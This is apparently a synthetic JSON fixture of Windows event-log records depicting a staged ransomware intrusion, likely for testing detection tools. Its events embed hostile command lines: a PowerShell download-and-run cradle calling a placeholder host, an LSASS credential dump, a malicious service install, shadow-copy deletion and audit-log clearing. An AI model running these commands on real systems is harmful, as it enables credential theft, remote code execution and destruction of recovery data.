@@ -1,0 +1,21 @@
+{
+  "schema_version": 1,
+  "computer": "SRV-APP01.contoso.lab",
+  "scenario": "Synthetic multi-stage ransomware intrusion",
+  "events": [
+    {"EventId": 4625, "TimeCreated": "2026-11-25T02:10:01Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"TargetUserName": "svc-backup", "IpAddress": "198.51.100.44"}},
+    {"EventId": 4625, "TimeCreated": "2026-11-25T02:10:15Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"TargetUserName": "svc-backup", "IpAddress": "198.51.100.44"}},
+    {"EventId": 4625, "TimeCreated": "2026-11-25T02:10:28Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"TargetUserName": "adm-tier1", "IpAddress": "198.51.100.44"}},
+    {"EventId": 4625, "TimeCreated": "2026-11-25T02:10:42Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"TargetUserName": "adm-tier1", "IpAddress": "198.51.100.44"}},
+    {"EventId": 4625, "TimeCreated": "2026-11-25T02:11:05Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"TargetUserName": "adm-tier1", "IpAddress": "198.51.100.44"}},
+    {"EventId": 4624, "TimeCreated": "2026-11-25T02:12:30Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"TargetUserName": "adm-tier1", "LogonType": "10", "IpAddress": "198.51.100.44"}},
+    {"EventId": 4672, "TimeCreated": "2026-11-25T02:12:31Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"SubjectUserName": "adm-tier1"}},
+    {"EventId": 4769, "TimeCreated": "2026-11-25T02:14:00Z", "Computer": "DC01.contoso.lab", "Data": {"TargetUserName": "adm-tier1", "ServiceName": "MSSQLSvc/SRV-SQL01.contoso.lab:1433", "TicketEncryptionType": "0x17", "IpAddress": "10.20.1.50"}},
+    {"EventId": 4104, "TimeCreated": "2026-11-25T02:15:10Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"SubjectUserName": "adm-tier1", "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.invalid/stage2.ps1'); powershell -enc JABhAD0AMQAyADMA"}},
+    {"EventId": 4688, "TimeCreated": "2026-11-25T02:16:00Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"SubjectUserName": "adm-tier1", "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"}},
+    {"EventId": 7045, "TimeCreated": "2026-11-25T02:17:20Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"ServiceName": "WinSyncHelper", "ImagePath": "cmd.exe /c C:\\ProgramData\\payload.exe"}},
+    {"EventId": 5001, "TimeCreated": "2026-11-25T02:18:00Z", "Computer": "SRV-APP01.contoso.lab", "Message": "Microsoft Defender real-time protection disabled."},
+    {"EventId": 4688, "TimeCreated": "2026-11-25T02:19:00Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"SubjectUserName": "SYSTEM", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}},
+    {"EventId": 1102, "TimeCreated": "2026-11-25T02:20:10Z", "Computer": "SRV-APP01.contoso.lab", "Data": {"SubjectUserName": "adm-tier1"}, "Message": "The audit log was cleared."}
+  ]
+}
